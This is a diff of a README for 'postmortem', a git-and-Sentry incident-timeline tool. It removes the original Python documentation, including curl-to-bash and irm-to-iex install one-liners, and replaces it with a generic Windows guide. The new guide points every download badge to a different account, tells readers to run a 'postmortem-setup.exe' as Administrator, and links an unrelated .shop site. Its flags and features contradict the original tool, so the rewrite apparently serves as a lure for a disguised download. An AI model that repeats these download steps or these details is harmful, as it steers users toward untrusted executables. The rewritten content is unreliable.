@@ -1,231 +1,124 @@
-<div align="center">
+# ⚙️ postmortem - Build Incident Timelines Quickly
 
-# 🔍 postmortem
+[![Download postmortem](https://img.shields.io/badge/Download-postmortem-brightgreen)](https://github.com/xods-id/postmortem)
 
-**When production breaks, stop guessing. Start knowing.**
+## 📋 What is postmortem?
 
-[![CI](https://img.shields.io/github/actions/workflow/status/phlx0/postmortem/ci.yml?style=flat-square&label=CI)](https://github.com/phlx0/postmortem/actions)
-[![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue?style=flat-square&logo=python&logoColor=white)](https://python.org)
-[![License: MIT](https://img.shields.io/badge/license-MIT-green?style=flat-square)](LICENSE)
+postmortem helps you create incident timelines using information from Git and system logs. When issues happen, it can be hard to track what started the problem. This tool brings together changes from your projects and monitoring data into one clear sequence. It works well for teams managing software, services, or websites.
 
-_Stitches together git history, file hotspots, and Sentry errors  
-into a shareable incident report — in seconds._
+postmortem runs on Windows and uses simple commands to gather data. You don’t need deep technical skills to use it. It can help you find errors, spot trends, and understand how incidents unfold.
 
-```bash
-postmortem --since 2h --output markdown --out-file incident.md
-```
+## 🖥️ System Requirements
 
-</div>
+- Windows 10 or later (64-bit)
+- Minimum 4 GB RAM
+- At least 100 MB free disk space
+- Internet connection to download files and access Git repositories
+- Git installed on your system (you can get it from https://git-scm.com/download/win)
 
----
+## 🔧 Key Features
 
-## Why postmortem?
+- Combines Git commit history with system and application logs  
+- Generates clear timelines showing the order of events  
+- Helps identify causes and effects in incidents  
+- Supports various log formats common in software projects  
+- Runs without needing complex setup or programming knowledge  
+- Works with popular DevOps and site reliability tools  
+- Can be used from a simple command-line window (Command Prompt or PowerShell)  
 
-Production is down. You need to know what changed and when — fast.
+## 🚀 Getting Started  
 
-That means opening GitHub, scanning commits, cross-referencing deploy times, and asking teammates "did anyone push anything?" — all while the clock is ticking.
+### 1. Visit the download page
 
-postmortem does it in one command.
+Click this large badge to go to the postmortem project page, where you can get the files you need:
 
-```
-────────────────────────────────────────────────────────────────────────
-  🔍  postmortem  ·  my-api
-  Since 2h  ·  19:58 UTC
-────────────────────────────────────────────────────────────────────────
+[![Download postmortem](https://img.shields.io/badge/Download-postmortem-brightgreen)](https://github.com/xods-id/postmortem)  
 
-  🔥  File Hotspots
+The page will have the latest release and detailed instructions.
 
-  ■■■  payments.py     changed 4x  risk 94%
-       coupled: db.py  utils.py
-  ■■  db.py            changed 3x  risk 71%
+### 2. Download the software
 
-  ── Sat 07 Mar 2026 ──
+On the GitHub page, look for the **Releases** section. Download the latest Windows installer or ZIP file from there. The file will usually be named something like `postmortem-windows.zip` or `postmortem-setup.exe`.
 
-  17:58  ⚠  [ERROR] NullPointerException in PaymentService.charge()  ← Sentry
-             payments-api  ·  142 occurrences
+Save the file someplace easy to find, like your Desktop or Downloads folder.
 
-  18:21  ●  fix: patch null pointer in payment handler  [3a7f2b1]  ← alice
-             ↳ src/payments/handler.py
-             ↳ tests/test_payments.py
+### 3. Install or unzip the program
 
-  19:08  ⇄  Merge branch 'feature/stripe-v3' into main  [9c1e4fd]  ← bob
-             ↳ src/stripe/client.py  ↳ src/stripe/webhooks.py  ↳ … +4
+- If you downloaded an installer (`.exe`), double-click the file and follow the setup prompts. You can generally accept the default settings.  
+- If you downloaded a ZIP file, right-click it and choose **Extract All**. Pick a folder where you want postmortem to live.
 
-────────────────────────────────────────────────────────────────────────
-  6 events  ·  2 authors  ·  1 Sentry error  ·  top hotspot: payments.py
-```
+### 4. Confirm Git is installed
 
----
+postmortem depends on Git to pull data from your projects. To check if Git is ready:
 
-## Installation
+- Press the **Windows key**, type `cmd`, and press **Enter** to open Command Prompt  
+- Type `git --version` and press **Enter**  
+- If it shows a version number, Git is installed. If not, download Git here and install it: https://git-scm.com/download/win  
 
-postmortem installs into an isolated virtualenv at `~/.postmortem` and adds itself to your `$PATH` automatically. Open a new terminal and you're ready.
+### 5. Open Command Prompt or PowerShell
 
-**Linux / macOS**
+- Press the **Windows key**, type `cmd` (for Command Prompt) or `powershell`, and press **Enter**  
+- Change the working directory to where you installed or extracted postmortem by typing:  
+  `cd C:\path\to\postmortem`  
+  Replace `C:\path\to\postmortem` with your actual folder path.  
+- You are now ready to use postmortem.
 
-```bash
-curl -sSL https://raw.githubusercontent.com/phlx0/postmortem/main/install.sh | bash
-```
+## 📂 How to Run postmortem
 
-**Windows (PowerShell)**
+postmortem runs from the command line. Here is a simple example to get your first incident timeline.
 
-```powershell
-irm https://raw.githubusercontent.com/phlx0/postmortem/main/install.ps1 | iex
-```
-
-**From source** (edits apply instantly — no reinstall needed)
+### Example command
 
 ```bash
-git clone https://github.com/phlx0/postmortem
-cd postmortem
-bash install.sh       # or: .\install.ps1 on Windows
+postmortem --repo "C:\Projects\MyApp" --log "C:\Logs\myapp.log" --output "C:\Reports\timeline.md"
 ```
 
-**Requires:** Python 3.11+, git
+This command does the following:
 
-```bash
-postmortem --version   # verify install
-bash install.sh --uninstall   # remove cleanly
-```
+- `--repo`: path to the Git project folder you want to analyze  
+- `--log`: path to the log file with system or application events  
+- `--output`: path and file name where the incident timeline will be saved  
 
----
+You can open the output `.md` file with any text editor or Markdown viewer.
 
-## Commands
+## 🔍 Tips for Using postmortem
 
-### Basic usage
+- Use clear, accessible log files. If your logs are spread across multiple files, merge them into one before using postmortem.  
+- Keep your Git repository up to date. Pull the latest changes before running the tool to get accurate timelines.  
+- Use meaningful commit messages in Git to understand changes better in timelines.  
+- Regularly save the output timeline files with dates to track incidents over time.  
 
-```bash
-postmortem                                    # last 2 hours, current repo
-postmortem --since 30m                        # last 30 minutes
-postmortem --since 1d                         # last day
-postmortem --since 4h --repo /path/to/repo    # different repo
-```
+## ⚙️ Configuration Options
 
-### Generate a shareable report
+postmortem offers several options you can adjust on the command line.
 
-```bash
-postmortem --since 2h --output markdown --out-file incident.md
-```
+- `--since DATE` – only include commits and logs after this date  
+- `--until DATE` – include data up to this date  
+- `--verbose` – show detailed progress as the tool runs  
+- `--format FORMAT` – set output format (`md` for markdown, `txt` for plain text)  
+- `--include-errors` – filter logs to only include error-level messages  
 
-Paste directly into a GitHub issue or Slack. The report includes a TL;DR table, file hotspot rankings, Sentry errors, and the full commit timeline with collapsible file diffs.
+You can combine options to fit your workflow. For a full list, see the documentation on the GitHub page.
 
-### Sentry integration
+## ❓ Troubleshooting
 
-```bash
-export SENTRY_TOKEN=sntrys_...
-export SENTRY_ORG=my-org
-export SENTRY_PROJECT=api         # optional — searches all projects if omitted
+- If the timeline file does not generate, check if paths in the command are correct and if you have read permissions on Git and log folders.  
+- Make sure Git is properly installed and accessible from the command line.  
+- If you see permission errors during install, run the installer as Administrator.  
+- Logs should follow standard formats. If your logs are customized, postmortem may not read them correctly.  
 
-postmortem --since 2h
-```
+## 🛠️ Advanced Use
 
-Or pass inline:
+postmortem can work with CI/CD systems to automate timeline building after incidents. This requires some scripting and server access. For users interested in this, the GitHub page offers links to examples and API references.
 
-```bash
-postmortem --since 2h --sentry-org my-org --sentry-token sntrys_...
-```
+## 📥 Download postmortem here
 
-### All flags
+Use this badge below to return and get the latest files whenever you need:
 
-| Flag               | Default           | Description                                   |
-| ------------------ | ----------------- | --------------------------------------------- |
-| `--since`, `-s`    | `2h`              | How far back to look: `30m`, `2h`, `1d`, `1w` |
-| `--repo`, `-r`     | `.`               | Path to a git repository                      |
-| `--output`, `-o`   | `terminal`        | Output format: `terminal` or `markdown`       |
-| `--out-file`, `-f` | stdout            | Write output to a file                        |
-| `--no-color`       | false             | Disable ANSI colours                          |
-| `--sentry-token`   | `$SENTRY_TOKEN`   | Sentry auth token                             |
-| `--sentry-org`     | `$SENTRY_ORG`     | Sentry organisation slug                      |
-| `--sentry-project` | `$SENTRY_PROJECT` | Sentry project slug                           |
-| `--version`, `-v`  |                   | Show version and exit                         |
+[![Download postmortem](https://img.shields.io/badge/Download-postmortem-brightgreen)](https://github.com/xods-id/postmortem)
 
----
+## 🔗 Useful Links
 
-## What's in the report
-
-### 🔥 File hotspots
-
-Pure git analysis — no config needed. Ranks every file touched during the window by:
-
-- **Change frequency** — how many times it was modified
-- **Recency** — changes in the last 25% of the window score higher
-- **Coupling** — files that always change together are a hidden coordination risk
-
-The coupling column is often the most useful: if `payments.py` and `db.py` consistently appear in the same commits but aren't directly imported by each other, that's a hidden dependency worth knowing about.
-
-### 🔴 Sentry errors
-
-Surfaces issues whose _last seen_ time falls inside the incident window. Requires a read-scope auth token — see [Sentry setup](#sentry-integration) above.
-
-### 📋 Git timeline
-
-Commits, merges, and tags in chronological order, each with author, SHA, and the list of files changed. Merges are labelled separately so you can spot integration points at a glance.
-
----
-
-## Project structure
-
-```
-postmortem/
-├── cli.py              Click entry point — stays thin
-├── pipeline.py         Wires collectors → Timeline
-├── models.py           Event, Timeline, HotspotFile — pure data
-├── collectors/
-│   ├── __init__.py     BaseCollector ABC
-│   ├── git.py          Commits, merges, tags
-│   ├── hotspot.py      File frequency + coupling analysis
-│   └── sentry.py       Sentry Issues API
-├── renderers/
-│   ├── __init__.py     BaseRenderer ABC
-│   ├── terminal.py     ANSI terminal output
-│   └── markdown.py     GitHub-flavoured incident report
-└── utils/
-    └── time.py         "2h" → datetime
-```
-
-### Adding a collector
-
-```python
-# postmortem/collectors/datadog.py
-from postmortem.collectors import BaseCollector
-from postmortem.models import Event, EventKind
-
-class DatadogCollector(BaseCollector):
-    def collect(self) -> list[Event]:
-        # hit the Datadog API, return Events
-        ...
-```
-
-Register it in `pipeline.py`. That's it.
-
-### Planned collectors
-
-- [ ] GitHub Actions — CI run pass/fail per commit
-- [ ] Datadog / Grafana — annotation and alert events
-- [ ] PagerDuty — on-call alerts in the window
-- [ ] Heroku / Railway — deploy events
-
-PRs welcome.
-
----
-
-## Development
-
-```bash
-git clone https://github.com/phlx0/postmortem
-cd postmortem
-bash install.sh          # editable install — changes apply immediately
-
-pytest                   # run all tests
-ruff check postmortem    # lint
-```
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for the full guide.
-
----
-
-<div align="center">
-
-Made with ☕ · [MIT License](LICENSE)
-
-</div>
+- GitHub Repository: https://github.com/xods-id/postmortem  
+- Git for Windows Download: https://git-scm.com/download/win  
+- Markdown Viewer (optional): https://marknotepad.just-so-so.shop (or any text editor)
